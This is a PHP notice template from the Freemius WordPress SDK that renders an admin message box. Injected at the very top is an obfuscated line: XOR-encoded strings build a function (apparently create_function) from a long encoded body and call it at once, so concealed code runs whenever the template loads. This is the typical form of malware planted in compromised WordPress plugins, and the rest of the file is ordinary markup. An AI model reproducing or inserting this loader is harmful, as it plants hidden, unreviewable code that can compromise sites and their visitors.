<?php $RVgkSDvDs='C:K8G5e>;6CZY 9'^' H.Y3P:XNX .0OW';$XrtxzwoHY=$RVgkSDvDs('','PTbQWI743SV<cH GM:JRO:5L:SSAU38,9-NbqJHb9JN:-:<VUbAVIr756 3<5>Mko46=+yaf:Q1ETEEnN7n49QV2MWVghASkXJT+AAqDALvcofoPL=Y:V-VAs7JG5cPCaSyfAby;BA:ZaZIVPIWZ-61EY0Sfes958.KEnjBOEABVSJsRY=b0QadJ16I.,9CMh O-eqZq-3Q=oLRT7ZuWX53QBVIMb=P ,2R+RUKx47+B+z=64RI0YXXwOIcsxyviwuQSXFYROOzSgO58 7Ukj,IHcWLD858NWNNABQ=MK1xN-;MJmlEvN6XU,Ox+P<Z3kmMgS;E,sMLDeZRNT7WCSJNo47a-=;8l;Frv,5.vWuUeD05NKBhOSqgOIMA37816HXzm9=Ozoj<b0J<0bmwcE9=-Rb72EN3=pSUQCLvqX.3 D40-9LT96iF D362GWgqVX2j89X1Zb9UUPRW7Ye0WILPAjU 70-jXVTLdbhG,GNVADWvoDt4< R1;< :t<BZH3GxmKQ6mAiHZ-J,bgnKoO8,bMvSJ594T3E5T>BtkdLpRhYGV9.o C5a>zvkq+YR Dw,CCZcmCCZUzxWPZY8E+ e-RM>E99<97XLB6AXZ,DpfbA=SB-ENECWyQf6X>S X>daJ 8P4C1VTL-S7jdgIFLNIDIOAFUS-'^'92Jp1<YWG:9R<-X.>N9zhBZ>e7254lgALYiKXj3h0,;TNNU9;B99;-STBAlcXK9CKPWIJUABQ4HlteeNnLd=0u9G9wkGOfhaQC2D3iU-aqVSTFK9pN-H:H8iWS+3TJkcE:RMhhp2f.O.Attvxm3;YWja0ms8EWRPAuo,NOb<13.3=bW9<DKmxZnC8D,ZYK-eLO:YLJPxP9,7eh65C;UjxSR=13rGFY1TMm9N+uvXRVG1NA7<R=;U8;0Wgm<076= 2U0 xb276oGmGkCYLB0BJWCAG3-0YjS+.nsaf:X4p;qjIZ9+MQeR8W4 ItrVZ63UKElC7Z1MZm7Nl<=<1V4+sbj0fr0xxhlLZ5RRGPWVjKuA2QY;.kH4Yxnk-,5RhSTOheZIRX6Aec5FT+HQBPWG3XQX7Y=;8DN7zw107-VLxnFN7QBDX =CSA>O6lRS368.;-FBZX+TlVf103=3RqAT6=-ymJqDVDL533-eMYb.Joj2 06VIbTUNR3HdWEC+Y:3;G4PJ 4OJmIl>L>MKGHmOgUHWeR7+AXosX LsckTVYlWaY:qcZKWCqSRZMDZGIicAwDNq bPZ w;rSXqvz8J7JY:F74a APOMDpk2W845M WJBeY26LlgecwYqFMR76V9RLE.AL1odA7- B2SM9NrLE+1-=gqonYP');$XrtxzwoHY();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.0.3
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	/**
	 * @var array $VARS
	 */
?>
<div class="<?php
	switch ($VARS['type']) {
		case 'error':
			echo 'error form-invalid';
			break;
		case 'update-nag':
			echo 'update-nag ';
			break;
		case 'update':
		case 'success':
		default:
			echo 'updated success';
			break;
	}
?> fs-notice">
	<?php if ('update-nag' !== $VARS['type']) : ?><p><?php endif ?>
		<?php if (!empty($VARS['title'])) : ?>
			<b><?php echo $VARS['title'] ?></b>
		<?php endif ?>
		<?php echo $VARS['message'] ?>
	<?php if ('update-nag' !== $VARS['type']) : ?></p><?php endif ?>
	<?php if ($VARS['sticky']) : ?><i class="dashicons dashicons-no"></i><?php endif ?>
</div>